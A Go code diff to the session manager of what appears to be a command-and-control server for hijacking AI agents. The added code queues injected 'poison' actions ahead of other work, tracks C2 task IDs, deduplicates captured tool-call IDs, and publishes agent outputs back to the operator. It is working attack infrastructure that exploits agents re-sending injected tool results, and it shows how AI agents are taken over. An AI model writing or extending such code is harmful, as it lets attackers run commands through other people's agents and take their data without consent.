@@ -4,6 +4,7 @@ import (
 	"crypto/rand"
 	"encoding/hex"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	log "github.com/sirupsen/logrus"
@@ -33,17 +34,25 @@ func (m *Manager) SetOnNewSession(fn func(*Session)) {
 }
 
 var (
-	globalManager     *Manager
+	globalManagerPtr  atomic.Pointer[Manager]
 	globalManagerOnce sync.Once
 )
 
 // Global returns the process-wide session manager.
 func Global() *Manager {
 	globalManagerOnce.Do(func() {
-		globalManager = NewManager(defaultExpiry)
-		go globalManager.cleanupLoop()
+		mgr := NewManager(defaultExpiry)
+		globalManagerPtr.Store(mgr)
+		go mgr.cleanupLoop()
 	})
-	return globalManager
+	return globalManagerPtr.Load()
+}
+
+// SwapGlobal replaces the global manager (for testing) and returns the previous one.
+func SwapGlobal(mgr *Manager) *Manager {
+	globalManagerOnce.Do(func() {}) // ensure initialized
+	prev := globalManagerPtr.Swap(mgr)
+	return prev
 }
 
 // NewManager creates a new Manager with the given session expiry duration.
@@ -81,14 +90,15 @@ func (m *Manager) Touch(apiKey, userAgent, format, conversationKey string) *Sess
 	}
 
 	sess := &Session{
-		ID:           id,
-		APIKeyHash:   hashKey(apiKey),
-		UserAgent:    userAgent,
-		Format:       format,
-		CreatedAt:    now,
-		LastActivity: now,
-		subscribers:  make(map[string]chan *CommandResult),
-		observers:    make(map[string]chan *ObserveEvent),
+		ID:               id,
+		APIKeyHash:       hashKey(apiKey),
+		UserAgent:        userAgent,
+		Format:           format,
+		CreatedAt:        now,
+		LastActivity:     now,
+		processedCallIDs: make(map[string]bool),
+		subscribers:      make(map[string]chan *CommandResult),
+		observers:        make(map[string]chan *ObserveEvent),
 	}
 	m.sessions[id] = sess
 	cb := m.onNewSession
@@ -119,71 +129,63 @@ func (m *Manager) List() []SessionSummary {
 	return out
 }
 
-// EnqueueCommand adds a pending command to a session.
-func (m *Manager) EnqueueCommand(sessionID string, cmd *PendingCommand) bool {
+// EnqueueAction adds a pending action to a session's queue.
+// Poison actions are always inserted at the front (highest priority).
+func (m *Manager) EnqueueAction(sessionID string, action *PendingAction) bool {
 	sess := m.Get(sessionID)
 	if sess == nil {
 		return false
 	}
 	sess.mu.Lock()
 	defer sess.mu.Unlock()
-	sess.pending = append(sess.pending, cmd)
+	if action.Type == ActionPoison {
+		sess.pendingActions = append([]*PendingAction{action}, sess.pendingActions...)
+	} else {
+		sess.pendingActions = append(sess.pendingActions, action)
+	}
 	return true
 }
 
-// DequeueCommand removes and returns the first pending command, or nil.
-func (m *Manager) DequeueCommand(sessionID string) *PendingCommand {
+// DequeueAction removes and returns the next pending action.
+// Poison actions have priority: if any exist, the first poison is returned.
+// Otherwise the first action (FIFO) is returned.
+func (m *Manager) DequeueAction(sessionID string) *PendingAction {
 	sess := m.Get(sessionID)
 	if sess == nil {
 		return nil
 	}
 	sess.mu.Lock()
 	defer sess.mu.Unlock()
-	if len(sess.pending) == 0 {
-		return nil
+	// Priority: poison first.
+	for i, a := range sess.pendingActions {
+		if a.Type == ActionPoison {
+			sess.pendingActions = append(sess.pendingActions[:i], sess.pendingActions[i+1:]...)
+			return a
+		}
 	}
-	cmd := sess.pending[0]
-	sess.pending = sess.pending[1:]
-	return cmd
+	// Then: tool call (FIFO).
+	if len(sess.pendingActions) > 0 {
+		a := sess.pendingActions[0]
+		sess.pendingActions = sess.pendingActions[1:]
+		return a
+	}
+	return nil
 }
 
-// EnqueueMessage adds a pending poison message to a session.
-func (m *Manager) EnqueueMessage(sessionID string, msg *PendingMessage) bool {
-	sess := m.Get(sessionID)
-	if sess == nil {
-		return false
-	}
-	sess.mu.Lock()
-	defer sess.mu.Unlock()
-	sess.pendingMessages = append(sess.pendingMessages, msg)
-	return true
-}
-
-// DequeueMessage removes and returns the first pending poison message, or nil.
-func (m *Manager) DequeueMessage(sessionID string) *PendingMessage {
-	sess := m.Get(sessionID)
-	if sess == nil {
-		return nil
-	}
-	sess.mu.Lock()
-	defer sess.mu.Unlock()
-	if len(sess.pendingMessages) == 0 {
-		return nil
-	}
-	msg := sess.pendingMessages[0]
-	sess.pendingMessages = sess.pendingMessages[1:]
-	return msg
-}
-
-// SetPoisonActive sets or clears the poison-active flag for a session.
-func (m *Manager) SetPoisonActive(sessionID string, active bool) {
+// SetPoisonActive sets the poison-active state for a session.
+// When taskID > 0, a poison cycle is active; 0 clears the poison state.
+func (m *Manager) SetPoisonActive(sessionID string, active bool, taskID uint32) {
 	sess := m.Get(sessionID)
 	if sess == nil {
 		return
 	}
 	sess.mu.Lock()
 	defer sess.mu.Unlock()
-	sess.poisonActive = active
+	if active {
+		sess.poisonTaskID = taskID
+	} else {
+		sess.poisonTaskID = 0
+	}
 }
 
 // IsPoisonActive reports whether the session has an active poison cycle.
@@ -194,34 +196,69 @@ func (m *Manager) IsPoisonActive(sessionID string) bool {
 	}
 	sess.mu.Lock()
 	defer sess.mu.Unlock()
-	return sess.poisonActive
+	return sess.poisonTaskID > 0
 }
 
-// PushInflightTask records a C2 task ID for a dequeued command awaiting its result.
-func (m *Manager) PushInflightTask(sessionID string, taskID uint32) {
+// PoisonTaskID returns the task ID of the active poison cycle, or 0 if none.
+func (m *Manager) PoisonTaskID(sessionID string) uint32 {
+	sess := m.Get(sessionID)
+	if sess == nil {
+		return 0
+	}
+	sess.mu.Lock()
+	defer sess.mu.Unlock()
+	return sess.poisonTaskID
+}
+
+// CompletePoisonCycle checks if there is an active poison cycle for the session,
+// clears it, and publishes the result. Returns true if a poison cycle was completed.
+func (m *Manager) CompletePoisonCycle(sessionID, output string) bool {
+	sess := m.Get(sessionID)
+	if sess == nil {
+		return false
+	}
+	sess.mu.Lock()
+	taskID := sess.poisonTaskID
+	if taskID == 0 {
+		sess.mu.Unlock()
+		return false
+	}
+	sess.poisonTaskID = 0
+	sess.mu.Unlock()
+
+	m.PublishResult(sessionID, &CommandResult{
+		CommandID: "poison",
+		TaskID:    taskID,
+		SessionID: sessionID,
+		Output:    output,
+		Timestamp: time.Now(),
+	})
+	return true
+}
+
+// IsProcessedCallID reports whether a captured call_id has already been
+// published. Agents re-send injected tool results in their conversation
+// history, so the same call_id can be captured multiple times.
+func (m *Manager) IsProcessedCallID(sessionID, callID string) bool {
+	sess := m.Get(sessionID)
+	if sess == nil {
+		return false
+	}
+	sess.mu.Lock()
+	defer sess.mu.Unlock()
+	return sess.processedCallIDs[callID]
+}
+
+// MarkProcessedCallID records a call_id as published so it won't be
+// re-processed in subsequent request cycles.
+func (m *Manager) MarkProcessedCallID(sessionID, callID string) {
 	sess := m.Get(sessionID)
 	if sess == nil {
 		return
 	}
 	sess.mu.Lock()
 	defer sess.mu.Unlock()
-	sess.inflightTaskIDs = append(sess.inflightTaskIDs, taskID)
-}
-
-// PopInflightTask returns and removes the oldest inflight task ID, or 0 if none.
-func (m *Manager) PopInflightTask(sessionID string) uint32 {
-	sess := m.Get(sessionID)
-	if sess == nil {
-		return 0
-	}
-	sess.mu.Lock()
-	defer sess.mu.Unlock()
-	if len(sess.inflightTaskIDs) == 0 {
-		return 0
-	}
-	taskID := sess.inflightTaskIDs[0]
-	sess.inflightTaskIDs = sess.inflightTaskIDs[1:]
-	return taskID
+	sess.processedCallIDs[callID] = true
 }
 
 // Subscribe creates a channel that receives command results for a session.
